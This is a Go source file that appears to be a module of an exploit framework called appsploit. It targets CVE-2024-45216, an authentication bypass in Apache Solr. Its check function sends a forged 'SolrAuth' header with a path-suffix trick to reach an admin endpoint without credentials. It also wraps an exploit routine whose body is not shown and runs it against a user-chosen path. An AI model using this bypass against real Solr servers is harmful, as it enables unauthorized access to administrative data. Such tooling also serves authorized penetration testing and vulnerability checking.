package cve_2024_45216

import (
	"appsploit/pkg/utils"
	"strings"

	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"

	"github.com/urfave/cli/v2"
)

var (
	aliases     = []string{"45216", ""}
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, nil, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, nil, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "CVE-2024-45216",
		Description: "Apache Solr Authentication Bypass - Type: Authentication Bypass",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.Remote,
			Check:   exeenv.Remote,
			Exploit: exeenv.Remote,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) CheckSec(context *cli.Context) (vulnerabilityExists bool, err error) {
	baseURL := utils.Http.FormatURL(context)
	httpClient := *utils.Http.Client()
	httpClient.SetHeader("SolrAuth", "test")
	if resp, err := httpClient.Get(baseURL + "/solr/admin/info/system:/admin/info/key?wt=json"); err != nil {
		return false, err
	} else {
		if resp.StatusCode() == 200 && strings.Contains(string(resp.Body()), "solr_home") {
			v.VulnerabilityExists = true
		} else {
			v.VulnerabilityExists = false
		}
	}
	return v.BaseVulnerability.CheckSec(context)
}

func (v *vulnerability) Exploit(context *cli.Context) error {
	baseURL := utils.Http.FormatURL(context)
	urlPath := context.String("path")
	if vulnerabilityExists, err := v.CheckSec(context); err != nil {
		return err
	} else {
		if vulnerabilityExists {
			if resp, err := Exploit(baseURL, urlPath); err != nil {
				return err
			} else {
				v.VulnerabilityResponse = resp
				return nil
			}
		}
	}
	return nil
}
